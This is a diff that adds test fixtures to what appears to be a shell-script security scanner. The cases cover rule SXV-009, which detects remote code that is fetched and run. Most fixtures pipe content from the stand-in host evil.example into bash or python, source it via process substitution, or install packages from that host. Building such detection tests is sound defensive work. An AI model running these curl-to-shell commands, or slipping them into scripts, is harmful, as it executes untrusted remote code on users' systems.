@@ -55,3 +55,37 @@
 {"name":"local_install","ext":"sh","source":"pip install ./package.whl\n","expect":[]}
 {"name":"inline_python_assignment","ext":"sh","source":"curl https://evil.example/p | python -c 'data=sys.stdin.read(); exec(data)'\n","expect":["SXV-009"]}
 {"name":"inline_python_reassigned","ext":"sh","source":"curl https://evil.example/p | python -c 'data=sys.stdin.read(); data=\"safe\"; exec(data)'\n","expect":[]}
+{"name":"bash_xtrace_stdin","ext":"sh","source":"curl https://evil.example/p | bash -x\n","expect":["SXV-009"]}
+{"name":"bash_combined_flags_stdin","ext":"sh","source":"curl https://evil.example/p | bash -eu\n","expect":["SXV-009"]}
+{"name":"bash_pipefail_stdin","ext":"sh","source":"curl https://evil.example/p | bash -o pipefail\n","expect":["SXV-009"]}
+{"name":"env_bash_option_stdin","ext":"sh","source":"curl https://evil.example/p | env X=1 bash -x\n","expect":["SXV-009"]}
+{"name":"env_bash_script_operand","ext":"sh","source":"curl https://evil.example/p | env X=1 bash local-script.sh\n","expect":[]}
+{"name":"bash_option_script_operand","ext":"sh","source":"curl https://evil.example/p | bash -x local-script.sh\n","expect":[]}
+{"name":"python_stdin_bare","ext":"sh","source":"curl https://evil.example/p | python3\n","expect":["SXV-009"]}
+{"name":"python_stdin_dash","ext":"sh","source":"curl https://evil.example/p | python -\n","expect":["SXV-009"]}
+{"name":"python_script_operand","ext":"sh","source":"curl https://evil.example/p | python local.py\n","expect":[]}
+{"name":"inline_python_eval","ext":"sh","source":"curl https://evil.example/p | python -c 'eval(sys.stdin.read())'\n","expect":["SXV-009"]}
+{"name":"inline_python_multiline_assignment","ext":"sh","source":"curl https://evil.example/p | python -c $'data=sys.stdin.read()\\nexec(data)'\n","expect":["SXV-009"]}
+{"name":"source_process_substitution","ext":"sh","source":"source <(curl https://evil.example/p)\n","expect":["SXV-009"]}
+{"name":"dot_process_substitution","ext":"sh","source":". <(curl https://evil.example/p)\n","expect":["SXV-009"]}
+{"name":"pip_find_links_only","ext":"sh","source":"pip install torch --find-links https://packages.example/simple\n","expect":[]}
+{"name":"pip_index_only","ext":"sh","source":"pip install torch --index-url https://packages.example/simple\n","expect":[]}
+{"name":"npm_registry_only","ext":"sh","source":"npm install lodash --registry https://registry.example/\n","expect":[]}
+{"name":"bash_combined_eux_stdin","ext":"sh","source":"curl https://evil.example/p | bash -eux\n","expect":["SXV-009"]}
+{"name":"bash_combined_euxo_stdin","ext":"sh","source":"curl https://evil.example/p | bash -euxo pipefail\n","expect":["SXV-009"]}
+{"name":"env_bash_combined_eux_stdin","ext":"sh","source":"curl https://evil.example/p | /usr/bin/env X=1 bash -eux\n","expect":["SXV-009"]}
+{"name":"env_bash_no_assignment","ext":"sh","source":"curl https://evil.example/p | env bash\n","expect":["SXV-009"]}
+{"name":"inline_python_comment_only","ext":"sh","source":"curl https://evil.example/p | python -c '# exec(sys.stdin.read())'\n","expect":[]}
+{"name":"inline_python_string_only","ext":"sh","source":"curl https://evil.example/p | python -c 'note=\"data=sys.stdin.read(); exec(data)\"'\n","expect":[]}
+{"name":"pip_direct_and_index_url","ext":"sh","source":"pip install https://evil.example/p.whl --index-url https://registry.example/simple\n","expect":["SXV-009"]}
+{"name":"npm_direct_and_registry_url","ext":"sh","source":"npm install https://evil.example/p.tgz --registry https://registry.example/\n","expect":["SXV-009"]}
+{"name":"inline_python_import_direct","ext":"sh","source":"curl https://evil.example/p | python -c 'import sys; exec(sys.stdin.read())'\n","expect":["SXV-009"]}
+{"name":"inline_python_from_import_assignment","ext":"sh","source":"curl https://evil.example/p | python -c 'from sys import stdin; data=stdin.read(); exec(data)'\n","expect":["SXV-009"]}
+{"name":"bash_c_without_operand","ext":"sh","source":"curl https://evil.example/p | bash -c\n","expect":[]}
+{"name":"env_bash_c_without_operand","ext":"sh","source":"curl https://evil.example/p | env bash -c\n","expect":[]}
+{"name":"bash_shopt_without_operand","ext":"sh","source":"curl https://evil.example/p | bash -O\n","expect":[]}
+{"name":"env_bash_shopt_without_operand","ext":"sh","source":"curl https://evil.example/p | env bash -O\n","expect":[]}
+{"name":"bash_noexec","ext":"sh","source":"curl https://evil.example/p | bash -n\n","expect":[]}
+{"name":"env_bash_noexec","ext":"sh","source":"curl https://evil.example/p | env bash -n\n","expect":[]}
+{"name":"bash_dump_strings","ext":"sh","source":"curl https://evil.example/p | bash -D\n","expect":[]}
+{"name":"env_bash_dump_strings","ext":"sh","source":"curl https://evil.example/p | env bash -D\n","expect":[]}
